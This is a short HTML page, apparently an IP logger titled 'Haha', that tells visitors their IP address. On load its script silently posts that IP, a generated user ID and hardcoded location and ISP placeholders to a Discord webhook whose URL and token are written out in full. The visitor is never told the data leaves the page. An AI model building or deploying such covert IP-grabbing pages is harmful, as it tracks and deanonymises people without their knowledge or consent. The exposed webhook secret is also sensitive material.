<!DOCTYPE html>
<html>
  <head>
    <title>Haha</title>
    <script>
      function displayIP(location, isp, time) {
        fetch("https://api.ipify.org/?format=json")
          .then((response) => response.json())
          .then((data) => {
            const ipElement = document.getElementById("ip");
            ipElement.textContent = data.ip;
            const pageUserID = Date.now().toString();
            localStorage.setItem("pageUserID", pageUserID);
            sendToWebhook(data.ip, location, isp, time, pageUserID);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      function sendToWebhook(ip, location, isp, time, pageUserID) {
        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID;
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ content: message }),
        })
          .then((response) => {
            console.log("Success:", response);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
    </script>
  </head>
  <body onload="displayIP('New York', 'Comcast', '10:30am')">
    <p>Your IP address is: <span id="ip"></span></p>
  </body>
</html>
